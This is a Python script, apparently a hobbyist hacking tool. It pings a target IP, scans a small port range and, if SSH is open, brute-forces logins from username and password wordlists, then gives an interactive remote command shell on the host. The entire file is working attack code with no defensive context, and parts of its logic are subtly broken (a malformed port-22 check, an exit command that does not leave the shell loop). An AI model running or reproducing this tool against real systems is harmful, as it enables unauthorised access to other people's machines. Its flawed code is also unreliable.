import socket
import subprocess
from tqdm import tqdm
import ipaddress
import paramiko
import time

def pinger():
    while True:
        ip = input("Please enter target's ip address: ")
        try:
            if ipaddress.ip_address(ip):
                pass
        except Exception as e:
            print(f"target ip address is not valid", e)
            pinger()
        ping = subprocess.run(['ping', '-n', '4', ip], capture_output=True, text=True)
        print(ping.stdout)
        port_scan(ip,ping)


def port_scan(ip,ping):
        if "TTL" not in ping.stdout:
            print("target is down :( \n " )
            return
        if "TTL" in ping.stdout:
            open_ports = []
            for port in tqdm(range(10,30),desc="port scanning"):
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.settimeout(0.2)
                        s.connect((ip, port))
                        s.send(" ".encode())
                        response = s.recv(1024)
                        print(f"port {port} is open : {response}")
                        open_ports.append(port)
                        print(f"open ports are {open_ports}")
                        if port == 22 in open_ports:
                            hack = input("would you like to use ssh? y/n: ")
                            if hack.lower() == "y":
                                brute_ssh(ip)
                            elif hack.lower() == "n":
                                continue
                            # brute_ssh(ip)
                except:
                    pass
            if open_ports == []:
                print("there are no open ports")
            else:
                print(f"open ports are {open_ports}")

def brute_ssh(ip):
    with open(r"wordlist/user.txt", "rt") as f, \
            open(r"wordlist/passwords.txt", "rt") as g:
        passwords = g.read().splitlines()
        users = f.read().splitlines()
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        for user in users:
            for password in passwords:
                time.sleep(10)
                try:
                    client.connect(ip, 22, user, password)
                    print(f"[+] connected to {user}@{ip} with password {password}:22")
                    while True:
                        cmd = input("ssh=> ")
                        if cmd.lower() in ["exit","quit"]:
                            client.close()
                            print("[*] connection closed, continue scanning. ")

                        stdin, stdout, stderr = client.exec_command(cmd)
                        out = stdout.read().decode(errors="ignore")
                        err = stderr.read().decode(errors="ignore")

                        if out:
                            print(out)
                        if err:
                            print(err)
                except paramiko.SSHException as e:
                    print(f"[-]{e} {user}:{password} failed to connect")
















if __name__ == "__main__":
    pinger()








